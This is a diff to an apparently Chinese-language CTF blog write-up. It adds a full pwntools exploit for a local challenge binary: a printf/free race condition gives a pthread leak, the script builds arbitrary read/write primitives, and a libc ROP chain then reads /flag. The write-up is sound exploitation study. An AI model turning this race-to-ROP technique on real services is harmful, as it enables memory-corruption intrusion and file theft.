@@ -364,6 +364,125 @@ p.interactive()
 通过使用message[3] 来进行后续的利用
 ```
 
+对代码做如下修改:<br>
+```python
+from pwn import *
+import os
+#context.log_level='debug'
+context.arch = 'amd64'
+
+p = process("./test")
+gdb.attach(p,"continue\n")
+r1 = remote("127.0.0.1",1337)
+r2 = remote("127.0.0.1",1337)
+
+idx = 0
+# race between printf and free-zero_out
+def leak_pthread_addr(r1,r2):
+    global idx
+    while True: # loop until get the pthread leak
+        if os.fork() == 0:
+            for i in range(10000):
+                r1.sendline(b"malloc %d scanf %d AAAAAAAABBBBBBBB free %d" %(idx,idx,idx))
+            os.kill(os.getpid(),9)
+        for i in range(10000):
+            r2.sendline(b"printf %d"%(idx))
+        os.wait() # wait until the child process ends
+        r1.clean()
+        output = r2.clean() # 从远端连接中，清空并返回所有当前接收到的数据。
+        try:
+            leak  = u64(next(x for x in output.split(b"\n") if b"\x7f" in x)[17:].ljust(8,b"\x00"))
+            break
+        except Exception as e:
+            print(e)
+            print("start again !!!")
+    idx += 1
+    return leak
+
+def arbitrary_read(r1,r2,addr):
+    global idx
+    r1.clean()
+    r2.clean() # clean the recv buffer
+    r1.sendline(b"malloc %d malloc %d free %d" %(idx,idx+1,idx+1))
+    while True:
+        if os.fork() == 0:
+            r1.sendline(b"free %d" %(idx))
+            os.kill(os.getpid(),9)
+        r2.sendline((b"scanf %d "%(idx)+p64(addr)+b"\n")*2000)
+        os.wait()# wait until the child process ends
+        r1.sendline(b"malloc %d printf %d" %(idx,idx))
+        r1.recvuntil(b"MESSAGE: ")
+        output = r1.recvline().strip(b"\n")
+        target = p64(addr).split(b"\x00")[0] # fprintf will stop when met \x00
+        if output == target:
+            break
+    r1.sendline(b"malloc %d"%(idx+1))
+    r1.clean()
+    r1.sendline(b"printf %d"%(idx+1))
+    r1.recvuntil(b"MESSAGE: ")
+    leak = u64(r1.recvline().strip(b"\n").ljust(8,b"\x00"))
+    idx += 2
+    return leak
+
+def arbitrary_write(r1,r2,addr,value):
+    global idx
+    print(b"idx: %d"% idx)
+    r1.clean()
+    r2.clean() # clean the recv buffer
+    #context.log_level = 'debug'
+    r1.sendline(b"malloc %d malloc %d free %d" %(idx,idx+1,idx+1))
+    #pause()
+    while True:
+        if os.fork() == 0:
+            r1.sendline(b"free %d" %(idx))
+            os.kill(os.getpid(),9)
+        r2.sendline((b"scanf %d "%(idx)+p64(addr)+b"\n")*2000)
+        os.wait()# wait until the child process ends
+        r1.sendline(b"malloc %d printf %d" %(idx,idx))
+        r1.recvuntil(b"MESSAGE: ")
+        output = r1.recvline().strip(b"\n")
+        target = p64(addr).split(b"\x00")[0] # fprintf will stop when met \x00
+        if output == target:
+            break
+    r1.sendline(b"malloc %d"%(idx+1))
+    r1.clean()
+    r1.sendline(b"scanf %d "%(idx+1)+value)
+    idx += 2
+    return       
+
+pthread_addr = leak_pthread_addr(r1,r2)
+log.success(f"pthread_addr: {hex(pthread_addr)}")
+main_arena_addr_ptr = pthread_addr - 0x40
+log.success(f"main_arena_addr_ptr: {hex(main_arena_addr_ptr)}")
+main_arena_addr = arbitrary_read(r1,r2,main_arena_addr_ptr)
+log.success(f"main_arena_addr: {hex(main_arena_addr)}")
+# arbitrary_write(r1,r2,main_arena_addr,p64(0x4141414141414141))
+# log.success(f"write successfully in {hex(main_arena_addr)}")
+libc_base = main_arena_addr - 0x1ecb80
+log.success(f"libc_base: {hex(libc_base)}")
+stored_rip_addr = libc_base - 0x4138  # stack is just next to libc (i don't why but it's true) 或许第一个创建的线程，其栈紧邻libc的前方是某种机制。
+program_base = arbitrary_read(r1,r2,stored_rip_addr)
+program_base = program_base - 0x172f
+log.success(f"program_base:  {hex(program_base)}")
+
+# ROP
+libc = p.elf.libc
+libc.address = libc_base
+rop_chain = ROP(libc,badchars=b"\x09\x0a\x0b\x0c\x0d\x0e\x20") # badchars is the set which contains characters(scanf won't receive)
+# rop_chain.call("close",[3])
+rop_chain.call("read",[0,libc.bss(0x123),42])
+rop_chain.call("open",[libc.bss(0x123),0])
+rop_chain.call("sendfile",[1,7,0,1024]) # 为什么是7，一个个试过去
+rop_chain.call("exit",[42])
+arbitrary_write(r1,r2,stored_rip_addr,rop_chain.chain())
+r1.sendline(b"quit")
+p.send("/flag\x00")
+print(f"leak: {p.readall()}")
+print(f"exit: {p.poll()}")
+#p.interactive()
+```
+
+![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250515230131.png)
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
 <script>
